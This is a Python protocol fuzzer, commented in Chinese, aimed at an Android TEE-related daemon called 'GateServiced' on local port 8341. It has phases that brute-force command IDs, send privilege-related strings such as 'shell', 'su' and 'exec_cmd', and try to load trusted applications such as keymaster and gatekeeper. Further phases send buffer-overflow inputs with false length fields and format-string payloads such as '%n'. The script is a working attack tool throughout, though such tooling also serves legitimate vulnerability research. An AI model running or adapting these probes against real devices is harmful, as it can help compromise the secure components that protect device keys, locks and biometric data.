#!/usr/bin/env python3
"""
GateServiced Protocol Fuzzer v3
基於逆向分析的協議格式進行模糊測試
"""

import socket
import struct
import time
import sys

HOST = '127.0.0.1'
PORT = 8341
TIMEOUT = 2

def send_recv(data):
    """發送數據並接收回應"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((HOST, PORT))
        sock.send(data)
        resp = sock.recv(65536)
        sock.close()
        return resp
    except Exception as e:
        return None

def hexdump(data, max_len=64):
    """十六進制輸出"""
    if not data:
        return "None"
    data = data[:max_len]
    return ' '.join(f'{b:02x}' for b in data)

def try_command(cmd_data, desc=""):
    """嘗試命令並顯示結果"""
    resp = send_recv(cmd_data)
    if resp and len(resp) > 0:
        # 檢查是否有有意義的回應
        if resp != b'\x00' * len(resp):
            print(f"[+] {desc}")
            print(f"    Sent: {hexdump(cmd_data)}")
            print(f"    Recv ({len(resp)}B): {hexdump(resp)}")
            try:
                text = resp.decode('utf-8', errors='ignore')
                if text.strip():
                    print(f"    Text: {text[:100]}")
            except:
                pass
            print()
            return True
    return False

def fuzz_cmd_ids():
    """Fuzz 命令 ID"""
    print("=" * 60)
    print("Phase 1: Command ID Fuzzing")
    print("=" * 60)
    
    found = []
    
    # 常見命令 ID
    cmd_ids = [
        # 數字型
        0x0000, 0x0001, 0x0002, 0x0003, 0x0004, 0x0005,
        0x0010, 0x0011, 0x0020, 0x0100, 0x0101, 0x0200,
        0x1000, 0x1001, 0x2000, 0xFFFF,
        
        # ASCII 字符串型 (little-endian)
        0x6E757200,  # "run\x00"
        0x74696E69,  # "init"
        0x64616F6C,  # "load"
        0x6F666E69,  # "info"
        0x74736574,  # "test"
        0x6E65706F,  # "open"
        0x65736F6C,  # "lose" (close)
        0x74696578,  # "exit"
        0x74656700,  # "get\x00"
        0x74657300,  # "set\x00"
        0x64617265,  # "read"
        0x65746972,  # "rite" (write)
        0x63657865,  # "exec"
    ]
    
    for cmd_id in cmd_ids:
        # 格式 1: cmd_id (4B) + length (4B)
        data = struct.pack('<II', cmd_id, 0)
        if try_command(data, f"cmd_id=0x{cmd_id:08x} len=0"):
            found.append(cmd_id)
        
        # 格式 2: cmd_id (4B) + length (4B) + dummy payload
        data = struct.pack('<II', cmd_id, 8) + b'\x00' * 8
        if try_command(data, f"cmd_id=0x{cmd_id:08x} len=8"):
            found.append(cmd_id)
    
    return found

def fuzz_strings():
    """Fuzz 字符串命令"""
    print("=" * 60)
    print("Phase 2: String Command Fuzzing")
    print("=" * 60)
    
    commands = [
        b"run",
        b"init",
        b"load",
        b"info",
        b"test",
        b"open",
        b"exec",
        b"shell",
        b"root",
        b"su",
        b"debug",
        b"list",
        b"help",
        b"status",
        b"version",
        b"ta_list",
        b"load_ta",
        b"exec_cmd",
        b"run_exec_cmd_ta",
        b"get_info",
        b"tz_info",
        b"keymaster",
        b"gatekeeper",
        b"fingerprint",
        b"cxr_tee",
    ]
    
    for cmd in commands:
        # 純字符串
        try_command(cmd + b'\x00', f"string: {cmd.decode()}")
        
        # 帶長度前綴
        data = struct.pack('<I', len(cmd)) + cmd
        try_command(data, f"len+string: {cmd.decode()}")

def fuzz_ta_load():
    """嘗試載入 TA"""
    print("=" * 60)
    print("Phase 3: TA Load Attempts")
    print("=" * 60)
    
    # 已知的 TA 名稱 (從 whitelist)
    ta_names = [
        "fingerprint",
        "keymaster",
        "gatekeeper", 
        "cxr_tee",
        "voice_key",
        "iris_ta",
        "widevine",
        "hdcp2p2",
        "soter",
    ]
    
    # 嘗試不同的載入格式
    for ta in ta_names:
        ta_bytes = ta.encode()
        
        # 格式 1: "load" + ta_name
        data = b"load " + ta_bytes + b"\x00"
        try_command(data, f"load {ta}")
        
        # 格式 2: cmd_id(1) + ta_name
        data = struct.pack('<I', 1) + ta_bytes + b'\x00'
        try_command(data, f"cmd=1 ta={ta}")
        
        # 格式 3: cmd_id(0x100) + len + ta_name
        data = struct.pack('<II', 0x100, len(ta_bytes)) + ta_bytes
        try_command(data, f"cmd=0x100 ta={ta}")

def fuzz_buffer_overflow():
    """嘗試緩衝區溢出"""
    print("=" * 60)
    print("Phase 4: Buffer Overflow Tests")
    print("=" * 60)
    
    # 不同大小的 payload
    sizes = [256, 512, 1024, 4096, 8192, 16384]
    
    for size in sizes:
        # Pattern: cmd_id + size 聲明與實際不符
        data = struct.pack('<II', 1, 16) + b'A' * size
        try_command(data, f"overflow: declared=16, actual={size}")
        
        # 極大 size 值
        data = struct.pack('<II', 1, 0xFFFFFFFF) + b'A' * 64
        try_command(data, f"int overflow: size=0xFFFFFFFF")

def fuzz_format_string():
    """嘗試格式字符串攻擊"""
    print("=" * 60)
    print("Phase 5: Format String Tests")
    print("=" * 60)
    
    payloads = [
        b"%s%s%s%s%s",
        b"%n%n%n%n",
        b"%x" * 20,
        b"%p" * 20,
        b"AAAA%08x.%08x.%08x.%08x",
    ]
    
    for p in payloads:
        data = struct.pack('<II', 1, len(p)) + p
        try_command(data, f"fmt: {p[:20].decode('latin-1')}...")

def main():
    print("GateServiced Protocol Fuzzer v3")
    print(f"Target: {HOST}:{PORT}")
    print()
    
    # 測試連接
    test = send_recv(b"test")
    if test is None:
        print("[-] Cannot connect to GateServiced")
        print("[-] Make sure: adb forward tcp:8341 tcp:8341")
        return
    
    print(f"[+] Connection OK, test response: {hexdump(test)}\n")
    
    fuzz_cmd_ids()
    fuzz_strings()
    fuzz_ta_load()
    fuzz_buffer_overflow()
    fuzz_format_string()
    
    print("\n[*] Fuzzing complete!")

if __name__ == "__main__":
    main()
